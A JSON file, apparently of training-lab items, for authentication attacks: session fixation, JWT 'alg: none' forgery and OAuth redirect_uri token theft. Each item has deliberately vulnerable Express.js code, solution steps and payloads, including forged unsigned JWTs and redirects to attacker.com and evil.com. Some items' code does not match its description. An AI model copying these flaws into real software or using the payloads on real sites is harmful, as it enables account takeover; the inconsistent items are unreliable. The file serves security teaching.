[{
  "Lab scenario": "Session fixation via cookie injection",
  "Lab Description": "This lab demonstrates session fixation in the authentication process. The application assigns session IDs before authentication and fails to invalidate them post-login. The application reuses existing session cookies instead of issuing new ones after login. To solve: Fixate a valid session ID before login and hijack Carlos's authenticated session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite Proxy to capture a pre-login request to /login and observe the Set-Cookie header containing the session ID.",
    "Send the pre-login request to Burp Repeater and extract the session cookie.",
    "Log in to your own account using the session cookie to verify the session fixation behavior.",
    "Send a crafted phishing link to Carlos with the fixed session ID in a Set-Cookie header using OWASP ZAP or a controlled web page.",
    "Once Carlos logs in with the attacker-defined session, reuse the fixed session ID to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'secret123' }; app.get('/login', (req, res) => { if (!req.cookies.sessionID) { const sid = Math.random().toString(36).substring(7); res.cookie('sessionID', sid); sessions[sid] = null; } res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionID] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionID]; if (user) { res.send(`Welcome back, ${user}`); } else { res.send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "Set-Cookie: sessionID=attackerSession",
    "GET /login HTTP/1.1 with injected sessionID",
    "Login link: http://victimsite/login with pre-set cookie sessionID=attackerSession",
    "GET /my-account with sessionID=attackerSession"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion with none header",
  "Lab Description": "This lab's JWT validation mechanism trusts the 'alg' header from incoming tokens. The application accepts unsigned tokens if the alg is set to 'none'. To solve: Forge a JWT token with alg: none and impersonate the user Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to capture a valid login and observe the JWT in the Authorization header.",
    "Decode the JWT using jwt.io and identify the algorithm used in the header, typically 'HS256'.",
    "Modify the JWT to set alg: none and change the payload to {\"username\":\"carlos\"}.",
    "Remove the signature part and reconstruct the token with only header and payload.",
    "Use the forged token in the Authorization header and request /my-account to confirm impersonation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; const users = { carlos: 'secret123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${payload.username}`); } catch (err) { res.status(403).send('Access denied'); } }); app.listen(4001);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer [unsigned JWT]",
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}"
  ]
},
{
  "Lab scenario": "OAuth token leakage via referer header",
  "Lab Description": "The application exposes access tokens via the Referer header due to improper redirection. Tokens are embedded in URLs and leak during third-party image or script loads. To solve: Capture Carlos's access token from the Referer header and use it to access his account via the OAuth /userinfo endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Login and inspect a successful OAuth redirect to see the access_token in the URL fragment.",
    "Embed a third-party image (e.g., <img src=\"http://attacker.com/log\">) in your profile bio field and save.",
    "Wait for Carlos to visit your profile, leaking his Referer to your server which includes the token.",
    "Retrieve the access token from server logs and replay it via Postman to the /userinfo endpoint.",
    "Use the returned JSON data to confirm Carlos’s identity and mark the lab as solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = { carlos: 'abc123token' }; const profiles = {}; app.post('/update-profile', (req, res) => { const { username, bio } = req.body; profiles[username] = { bio }; res.send('Profile updated'); }); app.get('/profile/:user', (req, res) => { const user = req.params.user; if (profiles[user]) { res.send(`<div>${profiles[user].bio}</div>`); } else { res.send('No profile'); } }); app.get('/userinfo', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) { res.json({ user }); } else { res.status(403).json({ error: 'Invalid token' }); } }); app.listen(4002);",
  "payloads": [
    "<img src=\"http://attacker.com/log\">",
    "OAuth redirect URL with access_token in fragment",
    "GET /userinfo?access_token=abc123token",
    "Referer: http://victim.com/callback#access_token=abc123token"
  ]
},
{
  "Lab scenario": "Session Fixation via Pre-Auth Token in Login Flow",
  "Lab Description": "This application fails to invalidate session tokens on login. An attacker can fix a session ID prior to authentication and hijack the victim’s session post-login. The application sets a session ID before verifying credentials but does not regenerate it. To solve: hijack Carlos’s session after login using a pre-fixed session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept GET /login using Burp Suite and capture the Set-Cookie header with the session token.",
    "Use Burp Repeater to manually log in as Carlos using valid credentials, but send the captured session cookie in the request header.",
    "Verify that the session ID is not changed after successful login.",
    "Craft a phishing scenario or use social engineering to trick Carlos into logging in using the attacker’s fixed session cookie.",
    "After login, use the fixed session ID to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixationSecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Account details for carlos'); else res.send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "GET /login -> capture session ID",
    "POST /login with fixed session cookie",
    "GET /my-account with session ID set to fixed value"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in Authorization Header",
  "Lab Description": "This lab uses JWTs for access control but improperly validates the signature algorithm. The server does not enforce signed JWTs when the 'alg' header is set to 'none'. To solve: forge a token impersonating Carlos and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the Authorization header after login as your own account.",
    "Decode the JWT using jwt.io or Burp Decoder and analyze the payload.",
    "Replace the 'alg' field in the JWT header with 'none' and remove the signature section entirely.",
    "Change the username in the payload to 'carlos' and re-encode the JWT (Base64Url).",
    "Send the modified token in the Authorization header and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; const users = [{ username: 'carlos' }, { username: 'wiener' }]; app.get('/login', (req, res) => { const user = users.find(u => u.username === req.query.user); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: user.username }, secret); res.send({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); const payload = jwt.decode(token); if (payload.user === 'carlos') return res.send('Account details for carlos'); res.send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"user\":\"carlos\"}",
    "Authorization: Bearer <header>.<payload>.",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "OAuth2 Redirect URI Manipulation in Authorization Code Flow",
  "Lab Description": "The application integrates with an OAuth provider but fails to properly validate redirect URIs during the authorization code exchange. An attacker can manipulate this to steal authorization codes. To solve: steal Carlos’s OAuth token and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP or Burp to analyze the OAuth flow from login initiation to redirect with code.",
    "Register a malicious domain (or use a request bin) and set it as the redirect_uri parameter.",
    "Send the manipulated OAuth login URL to Carlos via phishing or other delivery.",
    "Capture the redirected authorization code from Carlos’s session.",
    "Exchange the stolen code for an access token and use it to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth/callback', async (req, res) => { const code = req.query.code; const tokenResp = await axios.post('https://oauth.example.com/token', { code }); const token = tokenResp.data.access_token; const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); if (userInfo.data.username === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
  "payloads": [
    "https://oauth.example.com/auth?client_id=app123&redirect_uri=https://attacker.com/callback&response_type=code",
    "Capture redirected code from attacker.com",
    "POST to token endpoint with stolen code",
    "GET /my-account with Authorization: Bearer <token>"
  ]
},
{
  "Lab scenario": "GraphQL session fixation via login mutation",
  "Lab Description": "The application's GraphQL login mutation allows session fixation due to improper session regeneration. Upon successful authentication, the application does not invalidate the existing session ID, enabling attackers to predetermine a victim’s session. To solve: Hijack Carlos's session by setting a known session cookie prior to login and reuse it to access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, intercept your own GraphQL login mutation and observe that the session cookie is preserved post-login.",
    "2.In Burp Repeater, craft a login mutation using Carlos’s credentials and send it with a manually chosen session ID in the cookie header (e.g., session=attacker123).",
    "3.Confirm the response logs in Carlos and the session remains attacker123.",
    "4.Use the attacker123 cookie in a new request to /my-account and confirm it now grants access to Carlos’s account.",
    "5.Access /my-account with session=attacker123 to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'graphqlpass' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; if (query.includes('mutation Login')) { const { username, password } = variables; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.json({ data: { login: true } }); } } res.status(401).json({ error: 'Login failed' }); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "{\"query\":\"mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }\",\"variables\":{\"username\":\"carlos\",\"password\":\"graphqlpass\"}}",
    "Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion with none in REST API",
  "Lab Description": "The REST API accepts JWTs but fails to enforce strong algorithm validation. An attacker can forge a token by setting the algorithm to 'none' and bypass signature verification. To solve: Log in as the admin user by crafting a JWT with alg=none and access the protected admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Postman to capture the valid JWT issued after login with your account.",
    "2.Decode the token using jwt.io or Burp decoder and note the 'alg' field in the header.",
    "3.Replace 'alg' with 'none', set 'sub' to 'admin', and remove the signature part.",
    "4.Re-encode the header and payload using base64url and reconstruct the token without a signature.",
    "5.Send the forged token to /admin with Authorization: Bearer <forged-token> and verify access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: user.username }, 'supersecret'); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { return res.send('Admin access granted'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.sub === 'admin') return res.send('Admin access granted'); } catch (e) {} res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"sub\":\"admin\"}",
    "Final Token: base64url(header) + '.' + base64url(payload) + '.'"
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via referrer",
  "Lab Description": "The application uses OAuth implicit flow with access tokens returned in the URL fragment. Due to a misconfiguration, the redirect URI includes external domains, and the token leaks via the HTTP Referer header. To solve: Intercept Carlos’s token by injecting a malicious redirect_uri and reuse the token to access /user-info as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use OWASP ZAP to proxy the OAuth flow and initiate login using the victim's account.",
    "2.Modify the redirect_uri parameter to point to your attacker-controlled domain and capture the access_token from the URL fragment.",
    "3.Extract the access_token from the Referer header in requests made to your server.",
    "4.Use Postman to send GET /user-info with Authorization: Bearer <stolen-token>.",
    "5.Confirm that the token grants access to Carlos's user data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'token-carlos-123' }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (response_type === 'token') { const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); } else { res.status(400).send('Invalid request'); } }); app.get('/user-info', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'token-carlos-123') return res.send('User info: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "https://auth.example.com/oauth/authorize?response_type=token&client_id=client123&redirect_uri=https://evil.com/steal&state=xyz",
    "Authorization: Bearer token-carlos-123"
  ]
},
{
  "Lab scenario": "Session Fixation in login endpoint with pre-set cookies",
  "Lab Description": "This lab is vulnerable to session fixation. The application assigns session tokens before authentication and accepts them post-login without regeneration. An attacker can trick a victim into using a known session ID, then log in with that session and hijack their account. To solve: Hijack Carlos's session and access his My Account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite Proxy to capture the initial GET /login request and note that a session cookie is issued prior to authentication.",
    "2. Replay the request with a manually set session cookie (e.g., 'session=attackersession') and confirm it's accepted.",
    "3. Send a crafted link to the victim containing the pre-set session cookie (simulate victim opening it in browser).",
    "4. Log in using Carlos’s credentials while reusing the fixed session ID (attackersession).",
    "5. Once the victim logs in with that session ID, access /my-account using the same session to verify hijacked access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 's3cr3t' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = req.cookies.session || Math.random().toString(36).slice(2); res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Account: ${user}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
  "payloads": [
    "GET /login HTTP/1.1\\nCookie: session=attackersession",
    "POST /login HTTP/1.1\\nCookie: session=attackersession\\nusername=carlos&password=s3cr3t",
    "GET /my-account HTTP/1.1\\nCookie: session=attackersession"
  ]
},
{
  "Lab scenario": "JWT Tampering in Authorization Header using None algorithm",
  "Lab Description": "The application uses JWTs for session management but fails to enforce the use of strong algorithms. The server accepts tokens signed with 'none', effectively disabling signature verification. To solve: Modify a JWT to impersonate Carlos and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Capture a JWT from your own authenticated request using Postman or Burp.",
    "2. Decode the JWT using jwt.io or another decoder and modify the payload to {\"user\":\"carlos\"}.",
    "3. Change the 'alg' field in the header from 'HS256' to 'none'.",
    "4. Remove the signature portion and recombine header.payload.",
    "5. Replay the modified token in the Authorization: Bearer header and access /admin."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload && decoded.payload.user === 'carlos') { res.send('Welcome admin carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4001);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"user\":\"carlos\"}",
    "JWT: base64url(header).base64url(payload).(no signature)",
    "Authorization: Bearer [crafted JWT]"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in callback endpoint",
  "Lab Description": "The application integrates OAuth but doesn't properly validate the redirect_uri. This allows an attacker to redirect tokens to an attacker-controlled domain. To solve: Leak Carlos’s OAuth token using a crafted authorization URL, then use it to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp to intercept the /auth/login OAuth redirection and examine the redirect_uri parameter.",
    "2. Create a malicious redirect_uri pointing to your server (e.g., https://attacker.com/catch?token=).",
    "3. Craft a link to: /auth/login?redirect_uri=https://attacker.com/catch.",
    "4. Simulate Carlos clicking the link and authorize the app — the token is leaked to your server.",
    "5. Use the stolen token as Bearer in Authorization header to access /profile endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const tokens = { 'carlos': 'abc123carlos-token' }; app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri; const user = 'carlos'; const token = tokens[user]; const redirectWithToken = `${redirectUri}?token=${token}`; res.redirect(redirectWithToken); }); app.get('/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; if (Object.values(tokens).includes(token)) { res.send('Carlos Profile Accessed'); } else { res.status(403).send('Invalid token'); } }); app.listen(4002);",
  "payloads": [
    "/auth/login?redirect_uri=https://attacker.com/catch",
    "GET https://attacker.com/catch?token=abc123carlos-token",
    "Authorization: Bearer abc123carlos-token"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in token verification endpoint",
  "Lab Description": "The application uses JWT for authentication but improperly trusts the 'alg' field in incoming tokens. It accepts 'none' algorithm tokens without verifying their signature. The application exposes a /verify endpoint that decodes the token without validating its authenticity. To solve: Forge a JWT with 'alg':'none' to impersonate Carlos and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a valid login request using Burp Suite and extract the JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Burp Decoder and analyze the payload structure.",
    "Modify the token header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\"}, remove the signature part entirely.",
    "Send the modified token using Postman or Repeater in the Authorization header to the /verify endpoint and ensure it returns user info for Carlos.",
    "Access the /my-account endpoint using the forged token to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.post('/verify', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload && decoded.payload.username) { res.send(`Welcome ${decoded.payload.username}`); } else { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Alg Confusion Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
  ]
},
{
  "Lab scenario": "Session fixation through predictable token parameter",
  "Lab Description": "The application supports login sessions via a GET token parameter that is reflected as a session ID cookie. This behavior is vulnerable to session fixation. The attacker can set a predefined token value and trick the victim into using it. To solve: Fix a session ID and get Carlos to log in using it, then access /my-account as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Visit /login?token=attacker-session and observe that the session cookie is set to 'attacker-session'.",
    "Send Carlos a crafted phishing link using the same token: /login?token=attacker-session.",
    "Once Carlos logs in via that URL, the session remains tied to the token 'attacker-session'.",
    "Reuse the fixed session token by sending it as a cookie: Cookie: session=attacker-session to /my-account.",
    "Confirm access to Carlos’s account and verify with account data returned from the endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token; if (token) { sessions[token] = 'carlos'; res.cookie('session', token); res.send('Login page loaded'); } else { res.send('Missing token'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Welcome back, carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "/login?token=attacker-session",
    "Cookie: session=attacker-session"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allowing token reuse",
  "Lab Description": "The application implements OAuth 2.0 login with a misconfigured redirect_uri and access_token reuse logic. An attacker can obtain a valid token meant for a benign user and replay it against privileged APIs without scope validation. To solve: Replay Carlos’s access token against the /account-info endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to capture the OAuth flow when logging in with your own account and record the redirect_uri and access_token.",
    "Alter the redirect_uri to a domain you control, observe that the authorization server accepts arbitrary URIs.",
    "Reconstruct the authorization code exchange manually to extract a token for Carlos by modifying the state parameter to impersonate him.",
    "Replay the access_token against /account-info by adding Authorization: Bearer <token>.",
    "Confirm account ownership by extracting Carlos’s data from the JSON response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const tokens = { 'abc123-token': 'carlos' }; app.get('/account-info', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) { res.json({ user: tokens[token], email: tokens[token] + '@example.com' }); } else { res.status(403).send('Invalid access token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Reuse Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Authorization: Bearer abc123-token",
    "GET /account-info HTTP/1.1"
  ]
},
{
  "Lab scenario": "Session Fixation via Predictable Session Token in Login Flow",
  "Lab Description": "The application uses predictable session tokens set before authentication. Upon successful login, the session identifier is not rotated, allowing session fixation. An attacker can force a victim to use a known session and hijack it after login. To solve: Fixate the session, get the victim to log in, and access their account using the same session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the initial GET /login request and note the session cookie value.",
    "Send the session cookie to the victim (assumed click on malicious link).",
    "Instruct the victim (simulate) to log in with valid credentials while using the attacker-fixed session.",
    "Use Burp Repeater with the same session ID and access /my-account.",
    "Confirm session hijack and successful access to the victim's authenticated page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/login', (req, res) => { const sid = 'session_' + Math.floor(Math.random() * 1000); res.cookie('session', sid); sessions[sid] = { authenticated: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (!sessions[sid]) return res.status(400).send('Session not found'); sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Welcome!'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].authenticated) return res.send(`Account page for ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "Force victim to use session_id=session_123",
    "Access /my-account with same session after victim login"
  ]
},
{
  "Lab scenario": "JWT Signature None Bypass in REST Login Flow",
  "Lab Description": "The application uses JWT for authentication but accepts tokens with the 'alg' field set to 'none'. This enables an attacker to forge tokens and gain unauthorized access. To solve: Craft a JWT with alg=none and impersonate Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to capture a valid JWT after logging in with a known user.",
    "Decode the JWT using jwt.io or Burp Decoder to inspect header/payload.",
    "Craft a new token with header {\"alg\":\"none\"} and payload {\"user\":\"carlos\"}.",
    "Remove the signature portion and send request with Authorization: Bearer <unsigned token>.",
    "Access /account endpoint as Carlos to confirm successful bypass."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ user: username }, 'secret'); res.json({ token }); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const payload = jwt.verify(token, 'secret'); res.send(`Hello ${payload.user}`); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}, Payload: {\"user\":\"carlos\"}",
    "Authorization: Bearer <base64(header).base64(payload)>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration with Open Redirect Token Theft",
  "Lab Description": "This application uses OAuth to delegate authentication. The 'redirect_uri' parameter is not properly validated, allowing attackers to redirect authorization codes to attacker-controlled endpoints. To solve: Steal Carlos's token via crafted redirect and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate OAuth flow and intercept redirect_uri in authorization request.",
    "Modify the redirect_uri to attacker.com/callback and forward the request.",
    "Simulate victim login to OAuth provider using Carlos's credentials (pre-known).",
    "Capture authorization code on attacker's server at /callback.",
    "Exchange stolen code for access_token via POST to /oauth/token.",
    "Use access_token in GET /profile endpoint to access Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const axios = require('axios'); const app = express(); const clients = [{ client_id: '123', client_secret: 'abc', redirect_uri: 'http://trusted.com/callback' }]; const users = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Unknown client'); const authCode = 'code1234'; const redirect = `${redirect_uri}?code=${authCode}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'code1234') return res.json({ access_token: 'token_carlos' }); res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token_carlos') return res.send('Carlos private profile'); res.status(401).send('Unauthorized'); }); app.listen(5000);",
  "payloads": [
    "GET /auth?client_id=123&redirect_uri=http://attacker.com/callback&state=xyz",
    "Intercepted code=code1234, exchange with POST /token",
    "Authorization: Bearer token_carlos"
  ]
},
{
  "Lab scenario": "Session fixation via login flow cookie persistence",
  "Lab Description": "The application improperly reuses session identifiers during the authentication process. Instead of generating a new session after a successful login, it maintains the same session ID issued pre-authentication. This flaw enables session fixation attacks where a malicious actor sets a session ID for the victim before they log in. To solve: Fixate Carlos’s session, log him in using the fixed session, then access his My Account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept initial GET /login using Burp Suite and capture the Set-Cookie header to obtain the session ID.",
    "Send this session ID to the victim via social engineering or iframe injection.",
    "Once the victim logs in using the fixed session ID, monitor the session on the attacker’s side using Burp.",
    "Replay the session using the fixed session ID in the Cookie header and access /account.",
    "Verify successful session fixation by accessing Carlos's data through /account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); let sessions = {}; let users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).slice(2); res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; let sid = req.cookies.sid; if (users[username] && users[username] === password) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.redirect('/account'); } res.status(403).send('Invalid credentials'); }); app.get('/account', (req, res) => { let sid = req.cookies.sid; if (sessions[sid] && sessions[sid].authenticated) { return res.send('Account page for ' + sessions[sid].user); } res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /login --> Extract sid cookie",
    "POST /login with sid=attacker_fixed_sid --> Login with known credentials",
    "GET /account with sid=attacker_fixed_sid --> Access victim account"
  ]
},
{
  "Lab scenario": "JWT tampering due to 'none' algorithm vulnerability",
